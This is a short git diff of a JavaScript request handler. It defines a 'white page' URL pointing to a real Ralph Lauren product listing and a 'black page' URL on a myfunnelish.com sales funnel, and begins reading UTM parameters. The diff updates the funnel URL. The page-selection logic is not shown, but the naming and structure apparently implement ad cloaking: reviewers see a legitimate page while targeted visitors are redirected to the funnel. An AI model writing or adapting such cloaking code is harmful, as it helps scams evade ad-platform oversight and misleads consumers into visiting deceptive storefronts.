@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://www.ralphlauren.global/pk/en/cotton-chino-baseball-cap-461540.html?dwvar461540_colorname=Nubuck%2FRelay%20Blue&cgid=men-caps-hats-scarves-gloves#srsltid=AfmBOoq7kSn0_HlqBahd9KGTRIAY-3Cgaif0m2_lo7o_yqv3k5r308XD&start=1&cgid=men-caps-hats-scarves-gloves";
-    const blackPageURL = "https://IFRXJwhbvB.myfunnelish.com/imbassd-1735569734063202-1735754211879216";
+    const blackPageURL = "https://ifrxjwhbvb.myfunnelish.com/imbassd-1736979042571105-1738006308191131-1738511238414243";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
